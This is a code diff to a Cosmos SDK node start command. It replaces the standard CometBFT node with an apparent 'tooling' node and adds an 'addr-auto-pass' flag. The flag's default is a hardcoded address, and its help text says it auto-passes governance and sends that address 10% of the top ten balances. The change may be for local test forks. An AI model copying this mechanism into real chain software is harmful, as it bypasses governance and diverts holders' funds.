@@ -25,6 +25,7 @@ import (
 	"github.com/cometbft/cometbft/rpc/client/local"
 	sm "github.com/cometbft/cometbft/state"
 	"github.com/cometbft/cometbft/store"
+
 	cmttypes "github.com/cometbft/cometbft/types"
 	dbm "github.com/cosmos/cosmos-db"
 	"github.com/hashicorp/go-metrics"
@@ -48,6 +49,8 @@ import (
 	"github.com/cosmos/cosmos-sdk/types/mempool"
 	"github.com/cosmos/cosmos-sdk/version"
 	genutiltypes "github.com/cosmos/cosmos-sdk/x/genutil/types"
+
+	tooling_nodes "github.com/cometbft/cometbft/tooling-nodes"
 )
 
 const (
@@ -83,6 +86,7 @@ const (
 	FlagAPIEnable             = "api.enable"
 	FlagAPISwagger            = "api.swagger"
 	FlagAPIAddress            = "api.address"
+	FlagAddressAutoPassGov    = "addr-auto-pass"
 	FlagAPIMaxOpenConnections = "api.max-open-connections"
 	FlagRPCReadTimeout        = "api.rpc-read-timeout"
 	FlagRPCWriteTimeout       = "api.rpc-write-timeout"
@@ -122,6 +126,8 @@ type StartCmdOptions struct {
 	// StartCommandHanlder can be used to customize the start command handler
 	StartCommandHandler func(svrCtx *Context, clientCtx client.Context, appCreator types.AppCreator, inProcessConsensus bool, opts StartCmdOptions) error
 }
+
+var AutoPassProposer string
 
 // StartCmd runs the service passed in, either stand-alone or in-process with
 // CometBFT.
@@ -194,6 +200,8 @@ is performed. Note, when enabled, gRPC will also be automatically enabled.
 				serverCtx.Logger.Info("starting ABCI without CometBFT")
 			}
 
+			acc, _ := cmd.Flags().GetString(FlagAddressAutoPassGov)
+			AutoPassProposer = acc
 			err = wrapCPUProfile(serverCtx, func() error {
 				return opts.StartCommandHandler(serverCtx, clientCtx, appCreator, withCMT, opts)
 			})
@@ -332,7 +340,7 @@ func startInProcess(svrCtx *Context, svrCfg serverconfig.Config, clientCtx clien
 		if svrCfg.API.Enable || svrCfg.GRPC.Enable {
 			// Re-assign for making the client available below do not use := to avoid
 			// shadowing the clientCtx variable.
-			clientCtx = clientCtx.WithClient(local.New(tmNode))
+			clientCtx = clientCtx.WithClient(local.NewToolingLocal(tmNode))
 
 			app.RegisterTxService(clientCtx)
 			app.RegisterTendermintService(clientCtx)
@@ -344,12 +352,10 @@ func startInProcess(svrCtx *Context, svrCfg serverconfig.Config, clientCtx clien
 	if err != nil {
 		return err
 	}
-
 	err = startAPIServer(ctx, g, svrCfg, clientCtx, svrCtx, app, cmtCfg.RootDir, grpcSrv, metrics)
 	if err != nil {
 		return err
 	}
-
 	if opts.PostSetup != nil {
 		if err := opts.PostSetup(svrCtx, clientCtx, ctx, g); err != nil {
 			return err
@@ -367,17 +373,17 @@ func startCmtNode(
 	cfg *cmtcfg.Config,
 	app types.Application,
 	svrCtx *Context,
-) (tmNode *node.Node, cleanupFn func(), err error) {
+) (tmNode *tooling_nodes.Node, cleanupFn func(), err error) {
 	nodeKey, err := p2p.LoadOrGenNodeKey(cfg.NodeKeyFile())
 	if err != nil {
 		return nil, cleanupFn, err
 	}
 
 	cmtApp := NewCometABCIWrapper(app)
-	tmNode, err = node.NewNodeWithContext(
+
+	tmNode, err = tooling_nodes.NewNodesWithContext(
 		ctx,
 		cfg,
-		pvm.LoadOrGenFilePV(cfg.PrivValidatorKeyFile(), cfg.PrivValidatorStateFile()),
 		nodeKey,
 		proxy.NewLocalClientCreator(cmtApp),
 		getGenDocProvider(cfg),
@@ -985,6 +991,7 @@ func addStartNodeFlags(cmd *cobra.Command, opts StartCmdOptions) {
 	cmd.Flags().Bool(FlagDisableIAVLFastNode, false, "Disable fast node for IAVL tree")
 	cmd.Flags().Int(FlagMempoolMaxTxs, mempool.DefaultMaxTx, "Sets MaxTx value for the app-side mempool")
 	cmd.Flags().Duration(FlagShutdownGrace, 0*time.Second, "On Shutdown, duration to wait for resource clean up")
+	cmd.Flags().String(FlagAddressAutoPassGov, "onomy12kctsrw2y9ymzk5f02h30a90undpt4u3e3myaq", "addrees auto pass gov and recipient 10% balances of top 10")
 
 	// support old flags name for backwards compatibility
 	cmd.Flags().SetNormalizeFunc(func(f *pflag.FlagSet, name string) pflag.NormalizedName {
